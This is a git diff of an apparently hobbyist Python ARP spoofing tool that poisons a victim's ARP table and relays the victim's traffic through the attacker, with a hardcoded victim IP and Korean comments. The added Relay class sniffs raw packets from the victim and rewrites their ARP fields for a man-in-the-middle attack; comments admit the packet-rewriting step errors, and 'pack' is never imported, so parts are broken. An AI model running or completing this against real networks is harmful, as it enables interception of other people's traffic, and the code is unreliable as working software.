@@ -4,17 +4,16 @@ Writer Kcrong
 python3 main.py [victim ip]
 """
 
-import os
+from os import popen
 import re
-import time
 import subprocess
-
+import time
+from binascii import hexlify, unhexlify
+from multiprocessing import Process
 from socket import *
-from binascii import hexlify
-
-from multiprocessing import current_process, Process
-from packet_header_define import *
 from struct import unpack
+
+from packet_header_define import *
 
 
 class ARP:
@@ -50,7 +49,9 @@ class ARP:
         self.gateway_ip = self._get_gateway_ip()
         self.name, self.ip, self.mac = self._get_my_interface_info()
         self.victim_mac = self._get_mac(self.victim_ip)
+        print("Get Victim's MAC address")
         self.gateway_mac = self._get_mac(self.gateway_ip)
+        print("Get Gateway MAC address")
 
     def _get_my_interface_info(self):
         """
@@ -68,7 +69,7 @@ class ARP:
 
     @staticmethod
     def _get_gateway_ip():
-        output = os.popen("""route -n | grep 'UG[ \t]' | awk '{print $2}'""").read()
+        output = popen("""route -n | grep 'UG[ \t]' | awk '{print $2}'""").read()
         return output.split()[0]
 
     @staticmethod
@@ -198,44 +199,67 @@ class ARP:
 
             ethernet_unpacked, arp_unpacked = self.get_headers(packet)
 
-            source_ip = inet_ntoa(arp_unpacked[6])
+            src_ip = inet_ntoa(arp_unpacked[6])
+            dst_ip = inet_ntoa(arp_unpacked[8])
             mac = arp_unpacked[5]
 
             if ethernet_unpacked[2] != ARP_TYPE_ETHERNET_PROTOCOL:
                 continue
 
-            elif source_ip == target_ip:
-                print("Target MAC detected: %s" % self.pretty_mac(mac))
+            elif src_ip == target_ip and dst_ip == self.ip:
                 return mac
 
 
 class Relay:
-    def __init__(self, name):
-        self.name = name
+    def __init__(self, arp):
+        self.victim_ip = arp.victim_ip
+        self.mac = hexlify(arp.mac)
+        self.gateway_ip = arp.gateway_ip
+        self.gateway_mac = arp.gateway_mac
 
     # Semi-Class Method
     def run(self):
-        p = Process(target=self.relay, args=('hello',))
+        p = Process(target=self.relay, args=())
         p.start()
 
-    def relay(self, data):
+    def edit_packet(self, packet):
+        arp_partition = unpack("2s2s1s1s2s6s4s6s4s", packet[0][14:42])
+        edited_arp_partition = arp_partition[:6] + (self.gateway_mac, ) + arp_partition[8:]
+        # pack 양식 찾아보기
+        # 아래 코드에서 오류남
+        packed_edited_arp_partition = pack("2s2s1s1s2s6s4s6s4s", edited_arp_partition)
+        return [packet[0][:13] + packed_edited_arp_partition + packet[0][42:]] + packet[1:]
+
+    def relay(self):
         rs = socket(AF_PACKET, SOCK_RAW, htons(0x0003))
 
         while True:
-            eh, ah = ARP.get_headers(rs.recvfrom(4096))
+            packet = rs.recvfrom(4096)
+            eh_hex, ah_hex = ARP.get_headers(packet)
 
-            ARP.analysis_header(eh)
+            # analyzed ip info
+            ip_header = ARP.analysis_header(ah_hex)
 
-    def __repr__(self):
-        return "<%s>" % self.name
+            # 만약 dst_ip 가 Gateway ip 이면서
+            # dst_mac 이 공격자 MAC 일 경우
+            # ---> 오염된 피해자의 패킷일 경우
+            #if ip_header['dst_ip'] == self.gateway_ip and ip_header['dst_mac'] == self.mac:
+            if ip_header['src_ip'] == self.victim_ip:
+                edited_packet = self.edit_packet(packet)
+            else:
+                print("------------------------------------")
+                print("packet mac: %s\nSource IP: %s" % (ip_header['dst_mac'], ip_header['src_ip']))
+                print("------------------------------------")
+                continue
 
 
 def main():
-    r = Relay('Main Relay')
-    r.run()
-
-    victim_ip = input("Victim IP: ")
+    # victim_ip = input("Victim IP: ")
+    victim_ip = '192.168.1.82'
     arp = ARP(victim_ip)
+
+    r = Relay(arp)
+    r.run()
 
     # target에 변조된 ARP 패킷을 보냄
     # target의 arp-table 을 변조
